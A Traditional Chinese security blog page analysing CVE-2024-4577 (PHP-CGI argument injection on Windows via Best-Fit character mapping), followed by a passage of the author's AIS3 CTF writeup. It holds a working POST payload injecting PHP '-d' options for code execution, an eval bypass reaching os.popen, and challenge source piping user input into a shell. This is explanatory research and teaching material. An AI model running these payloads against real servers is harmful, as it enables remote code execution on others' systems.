<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (p = decoded_query_string; *p &amp;&amp;  *p &lt;= <span class="string">&#x27; &#x27;</span>; p++) &#123;</span><br><span class="line">			<span class="comment">/* skip all leading spaces */</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(*p == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">			skip_getopt = <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CVE-2024-4577"><a href="#CVE-2024-4577" class="headerlink" title="CVE-2024-4577"></a>CVE-2024-4577</h2><p>時隔12年，這個保護機制又被繞掉了，但這次並不影響到全部的php版本，而是只有某些特定語系的 Windows 作業系統，且需要由 CGI 解析才會觸發。</p>
<h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>這個漏洞是因為在 Windows 上有 <a target="_blank" rel="noopener" href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/bestfit936.txt">BEST-Fit</a> 的特性，讓攻擊者在繁體中文等特定語系環境的 Windows 直接生出一個完全不存在的字元(0xad)卻可以被解析成 <code>-</code> ，當然，你也可以透過<a target="_blank" rel="noopener" href="https://www.unicode.org/Public/MAPPINGS/VENDORS/MICSFT/WindowsBestFit/">這份文件</a>，找找看其他語系的 windows 有沒有可以 bypass 的字元。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>首先，我們可以來看看 PHP CGI 有哪些參數可以下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">❯ php-cgi --<span class="built_in">help</span>                                                                                                                                                                   ─╯</span><br><span class="line">Usage: php-cgi [-q] [-h] [-s] [-v] [-i] [-f &lt;file&gt;]</span><br><span class="line">       php-cgi &lt;file&gt; [args...]</span><br><span class="line">  -a               Run interactively</span><br><span class="line">  -b &lt;address:port&gt;|&lt;port&gt; Bind Path <span class="keyword">for</span> external FASTCGI Server mode</span><br><span class="line">  -C               Do not <span class="built_in">chdir</span> to the script<span class="string">&#x27;s directory</span></span><br><span class="line"><span class="string">  -c &lt;path&gt;|&lt;file&gt; Look for php.ini file in this directory</span></span><br><span class="line"><span class="string">  -n               No php.ini file will be used</span></span><br><span class="line"><span class="string">  -d foo[=bar]     Define INI entry foo with value &#x27;</span>bar<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  -e               Generate extended information for debugger/profiler</span></span><br><span class="line"><span class="string">  -f &lt;file&gt;        Parse &lt;file&gt;.  Implies `-q&#x27;</span></span><br><span class="line">  -h               This <span class="built_in">help</span></span><br><span class="line">  -i               PHP information</span><br><span class="line">  -l               Syntax check only (lint)</span><br><span class="line">  -m               Show compiled <span class="keyword">in</span> modules</span><br><span class="line">  -q               Quiet-mode.  Suppress HTTP Header output.</span><br><span class="line">  -s               Display colour syntax highlighted <span class="built_in">source</span>.</span><br><span class="line">  -v               Version number</span><br><span class="line">  -w               Display <span class="built_in">source</span> with stripped comments and whitespace.</span><br><span class="line">  -z &lt;file&gt;        Load Zend extension &lt;file&gt;.</span><br><span class="line">  -T &lt;count&gt;       Measure execution time of script repeated &lt;count&gt; <span class="built_in">times</span>.</span><br></pre></td></tr></table></figure>
<p>應該可以馬上發現， <code>-d</code> 參數非常有用，你可以把所有會妨礙你使用 <code>LFI</code> to RCE 的安全選項全部關掉，然後再用偽協議把髒髒的東西都寫進來</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST http:<span class="comment">//example.com/?-d%20allow_url_include%3Don%20-d%20auto_prepend%3Dphp%3A%2F%2Finput%2F%0A</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>() <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2024/08/08/CVE-2024-4577-PHP-CGI%E6%BC%8F%E6%B4%9E%E8%A4%87%E7%8F%BE%E5%8F%8A%E7%A0%94%E7%A9%B6/2.png" alt="透過php://filter偽協議include惡意程式碼"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-06-30T06:04:15.000Z" title="2024/6/30 下午2:04:15">2024-06-30</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:45:30.736Z" title="2024/11/17 下午12:45:30">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">17 分鐘讀完 (大約2538個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/">2024 AIS3 pre-exam &amp; MFCTF writeup</a></p><div class="content"><h1 id="2024-AIS3-pre-exam-writeup"><a href="#2024-AIS3-pre-exam-writeup" class="headerlink" title="2024 AIS3 pre-exam writeup"></a>2024 AIS3 pre-exam writeup</h1><p>這次幫 AIS3 pre-exam 和 MFCTF 出題，出了兩題：一題 web 和一題 misc (但其實兩題都是web)</p>
<h2 id="evil-calculator"><a href="#evil-calculator" class="headerlink" title="evil calculator"></a>evil calculator</h2><blockquote>
<p>This is a calculator written in Python. It’s a simple calculator, but some function in it is VERY EVIL!!<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5001/">http://chals1.ais3.org:5001</a><br>Author: TriangleSnake</p>
</blockquote>
<p>這是一題很簡單的pyjail(?有jail嗎)，主要問題出在 <code>eval()</code> function，但是有過濾 <code>_</code> 和 <code>space</code> 。<br>因為是warmup題，預期解是用<code>open()</code>讀flag，不會用到<code>_</code>和<code>space</code>。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;open(&#x27;/flag&#x27;,&#x27;r&#x27;).read()&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>當然，你也可以把 <code>_</code> 和 <code>space</code> encode 後 rce</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;expression&quot;</span><span class="punctuation">:</span><span class="string">&quot;eval(eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+&#x27;import&#x27;+eval(&#x27;chr(95)&#x27;)+eval(&#x27;chr(95)&#x27;)+\&quot;(&#x27;os&#x27;).popen(&#x27;&#x27;).read()\&quot;)&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{7RiANG13_5NAK3_I5_50_3Vi1}</p>
</blockquote>
<h2 id="emoji-console"><a href="#emoji-console" class="headerlink" title="emoji console"></a>emoji console</h2><blockquote>
<p>🔺🐍 😡 🅰️ 🆒 1️⃣Ⓜ️🅾️ 🚅☠️✉️ 🥫🫵 🔍🚩⁉️<br>Connection info: <a target="_blank" rel="noopener" href="http://chals1.ais3.org:5000/">http://chals1.ais3.org:5000</a><br>Author: TriangleSnake</p>
</blockquote>
<p>這題和資安沒什麼關係，純粹是拼字遊戲，可以隨便按幾個 emoji 後就可以發現他就是把你輸入的 emoji 轉成英文單字後變成一行指令</p>
<p><img src="/2024/06/30/2024-AIS3-pre-exam-MFCTF-writeup/1.png" alt="image"></p>
<p>試幾次會發現一些常用的指令，像是 🐱-&gt;<code>cat</code> 、 💿-&gt;<code>cd</code> ，還有題目剛進去就提示的 🐍-&gt;<code>python</code> 和 ⭐-&gt;<code>*</code></p>
<ol>
<li>嘗試使用 <code>cat</code> 命令看目錄下面有什麼<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🐱 ⭐</span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,send_file,request,redirect,jsonify,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">translate</span>(<span class="params">command:<span class="built_in">str</span></span>)-&gt;<span class="built_in">str</span>:</span><br><span class="line">    emoji_table = json.load(<span class="built_in">open</span>(<span class="string">&#x27;emoji.json&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> emoji_table:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> command:</span><br><span class="line">            command = command.replace(key,emoji_table[key])</span><br><span class="line">    <span class="keyword">return</span> command.lower()</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/api&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    command = request.args.get(<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(command).intersection(<span class="built_in">set</span>(string.printable.replace(<span class="string">&quot; &quot;</span>,<span class="string">&#x27;&#x27;</span>))))&gt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:<span class="string">&#x27;Invalid command&#x27;</span>&#125;)</span><br><span class="line">    command = translate(command)</span><br><span class="line">    result = os.popen(command+<span class="string">&quot; 2&gt;&amp;1&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;command&#x27;</span>:command,<span class="string">&#x27;result&#x27;</span>:result&#125;)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;😀&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😁&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😂&quot;</span>: <span class="string">&quot;:&#x27;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤣&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😃&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😄&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😅&quot;</span>: <span class="string">&quot;&#x27;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😆&quot;</span>: <span class="string">&quot;XD&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😉&quot;</span>: <span class="string">&quot;;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😊&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😋&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😎&quot;</span>: <span class="string">&quot;B)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😍&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😘&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😗&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😙&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😚&quot;</span>: <span class="string">&quot;:*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☺️&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙂&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤗&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤩&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤔&quot;</span>: <span class="string">&quot;:?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤨&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😐&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😑&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😶&quot;</span>: <span class="string">&quot;:|&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙄&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😏&quot;</span>: <span class="string">&quot;:]&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😣&quot;</span>: <span class="string">&quot;&gt;:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😥&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😮&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤐&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😯&quot;</span>: <span class="string">&quot;:o&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😪&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😫&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😴&quot;</span>: <span class="string">&quot;Zzz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😌&quot;</span>: <span class="string">&quot;:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😛&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😜&quot;</span>: <span class="string">&quot;;P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😝&quot;</span>: <span class="string">&quot;XP&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤤&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😒&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😓&quot;</span>: <span class="string">&quot;;/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😔&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😕&quot;</span>: <span class="string">&quot;:/&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙃&quot;</span>: <span class="string">&quot;(:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤑&quot;</span>: <span class="string">&quot;$)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😲&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;☹️&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🙁&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😖&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😞&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😟&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😤&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😢&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😭&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😦&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😧&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😨&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😩&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤯&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😬&quot;</span>: <span class="string">&quot;:E&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😰&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😱&quot;</span>: <span class="string">&quot;:O&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥵&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥶&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😳&quot;</span>: <span class="string">&quot;:$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤪&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😵&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥴&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😠&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😡&quot;</span>: <span class="string">&quot;&gt;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤬&quot;</span>: <span class="string">&quot;#$%&amp;!&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤕&quot;</span>: <span class="string">&quot;:(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤢&quot;</span>: <span class="string">&quot;X(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤮&quot;</span>: <span class="string">&quot;:P&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤧&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;😇&quot;</span>: <span class="string">&quot;O:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥳&quot;</span>: <span class="string">&quot;:D&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🥺&quot;</span>: <span class="string">&quot;:&#x27;(&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤡&quot;</span>: <span class="string">&quot;:o)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤠&quot;</span>: <span class="string">&quot;Y)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤥&quot;</span>: <span class="string">&quot;:L&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤫&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🤭&quot;</span>: <span class="string">&quot;:x&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐶&quot;</span>: <span class="string">&quot;dog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐱&quot;</span>: <span class="string">&quot;cat&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐭&quot;</span>: <span class="string">&quot;mouse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐹&quot;</span>: <span class="string">&quot;hamster&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐰&quot;</span>: <span class="string">&quot;rabbit&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦊&quot;</span>: <span class="string">&quot;fox&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐻&quot;</span>: <span class="string">&quot;bear&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐼&quot;</span>: <span class="string">&quot;panda&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐨&quot;</span>: <span class="string">&quot;koala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐯&quot;</span>: <span class="string">&quot;tiger&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🦁&quot;</span>: <span class="string">&quot;lion&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐮&quot;</span>: <span class="string">&quot;cow&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐷&quot;</span>: <span class="string">&quot;pig&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐽&quot;</span>: <span class="string">&quot;pig nose&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐸&quot;</span>: <span class="string">&quot;frog&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐒&quot;</span>: <span class="string">&quot;monkey&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐔&quot;</span>: <span class="string">&quot;chicken&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐧&quot;</span>: <span class="string">&quot;penguin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;🐦&quot;</span>: <span class="string">&quot;bird&quot;</span>,</span><br><span class="line">    <span 